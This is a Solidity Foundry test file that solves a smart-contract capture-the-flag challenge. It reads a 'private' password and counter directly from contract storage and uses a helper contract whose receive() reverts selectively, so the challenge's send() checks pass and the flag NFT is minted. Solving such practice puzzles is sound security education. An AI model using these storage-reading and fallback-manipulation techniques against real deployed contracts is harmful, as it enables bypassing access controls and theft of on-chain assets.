// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {BaseTest} from "../BaseTest.sol";
import {Season2Challenge8} from "../../../src/season2/Season2Challenge8.sol";

contract Challenge8Solution {
    Season2Challenge8 challenge;

    constructor(Season2Challenge8 _challenge) {
        challenge = _challenge;
    }

    // Step 3: Implement receive logic to control the result of the challenge's .send() calls
    receive() external payable {
        // lock3: require(send(1) == false)
        if (msg.value == 1) {
            revert("Block 1 wei");
        }
        // lock4: require(send(2) == true)
        if (msg.value == 2) {
            // accept silently
        }
    }

    function solve(bytes32 password) external payable {
        // Forward exactly 2 wei to the challenge
        challenge.mintFlag{value: 2}(password);
    }
}

contract Challenge8Test is BaseTest {
    Season2Challenge8 challenge8;

    function setUp() public {
        setUpChallenges();

        vm.startPrank(ADMIN);
        challenge8 = new Season2Challenge8(address(nftFlags), bytes32(uint256(0x123456)));
        nftFlags.addAllowedMinter(address(challenge8));
        vm.stopPrank();
    }

    function test_challenge8() public {
        vm.startPrank(PLAYER, PLAYER);

        // Step 1: Extract the "private" password and count from storage
        bytes32 password = vm.load(address(challenge8), bytes32(uint256(1)));
        bytes32 count = vm.load(address(challenge8), bytes32(uint256(2)));

        // Step 2: Replicate the masking logic
        bytes32 mask = ~(bytes32(uint256(0xFF) << ((31 - (uint256(count) % 32)) * 8)));
        bytes32 maskedPassword = password & mask;

        // Step 4: Deploy solution and execute
        Challenge8Solution solution = new Challenge8Solution(challenge8);
        
        // Satisfy lock2 (balance >= 2) and fund the solve call (2 wei)
        vm.deal(address(solution), 10 wei); 
        
        solution.solve(maskedPassword);

        // DONE: You should have obtained the flag for challenge #8
        assertTrue(nftFlags.hasMinted(PLAYER, 8));
    }
}